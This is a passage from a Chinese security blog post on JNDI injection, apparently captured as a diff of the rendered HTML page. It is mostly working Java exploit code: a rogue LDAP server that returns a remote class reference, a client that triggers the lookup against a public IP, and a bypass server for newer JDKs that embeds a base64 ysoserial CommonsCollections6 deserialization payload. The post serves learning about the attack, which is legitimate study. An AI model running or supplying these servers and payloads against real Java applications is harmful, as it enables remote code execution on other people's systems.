class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:9090/#Calculator&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099</span>;<br><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><strong>客户端</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://8.138.10.69:1099/Calculator&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h5 id="高版本-2"><a class="markdownIt-Anchor" href="#高版本-2"></a> 高版本</h5>
+<p>如果用反序列化，需要根据所选的链子加依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.text.ParseException;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServerByPass</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lanuchLDAPServer</span><span class="hljs-params">(Integer ldap_port, String http_server, Integer http_port)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    ldap_port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://&quot;</span>+http_server+<span class="hljs-string">&quot;:&quot;</span>+http_port+<span class="hljs-string">&quot;/#Calculator&quot;</span>)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + ldap_port);<br>            ds.startListening();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;calc&#x27;|base64</span><br>                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>,Base64.decode(<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));<br>            &#125; <span class="hljs-keyword">catch</span> (ParseException e1) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String[] args1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;9090&quot;</span>, <span class="hljs-string">&quot;1099&quot;</span>&#125;;<br>        args = args1;<br>        System.out.println(<span class="hljs-string">&quot;HttpServerAddress: &quot;</span>+args[<span class="hljs-number">0</span>]);<br>        System.out.println(<span class="hljs-string">&quot;HttpServerPort: &quot;</span>+args[<span class="hljs-number">1</span>]);<br>        System.out.println(<span class="hljs-string">&quot;LDAPServerPort: &quot;</span>+args[<span class="hljs-number">2</span>]);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">http_server_ip</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ldap_port</span> <span class="hljs-operator">=</span> Integer.valueOf(args[<span class="hljs-number">2</span>]);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">http_server_port</span> <span class="hljs-operator">=</span> Integer.valueOf(args[<span class="hljs-number">1</span>]);<br><br>        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12277?u_atoken=47def94559d313b6dec2ee5a681da7d6&amp;u_asig=1a0c384b17271798033023785e004a#toc-3">https://xz.aliyun.com/t/12277?u_atoken=47def94559d313b6dec2ee5a681da7d6&amp;u_asig=1a0c384b17271798033023785e004a#toc-3</a></p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1611/#toc_jndi-references">https://tttang.com/archive/1611/#toc_jndi-references</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15946406.html">https://www.cnblogs.com/bitterz/p/15946406.html</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <p class="note note-warning">
+                <strong>本文作者: </strong><a href="/">fru1ts</a> <br>
+                <strong>本文链接: </strong><a href="https://fru1ts.github.io/2024/09/24/JNDI%E6%B3%A8%E5%85%A5/">https://fru1ts.github.io/2024/09/24/JNDI%E6%B3%A8%E5%85%A5/</a> <br>
+                <strong>版权声明: </strong>本站均采用BY-SA协议，除特别声明外，转载请注明出处!
+                   </p>
+                   
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/23/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="ROME反序列化">
+                        <span class="hidden-mobile">ROME反序列化</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","appKey":"PSBkctB8cKrR97yZLNXnJ0nj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        Total number of visits 
+        <span id="leancloud-site-pv"></span>
+         
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        Total number of visitors 
+        <span id="leancloud-site-uv"></span>
+         
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
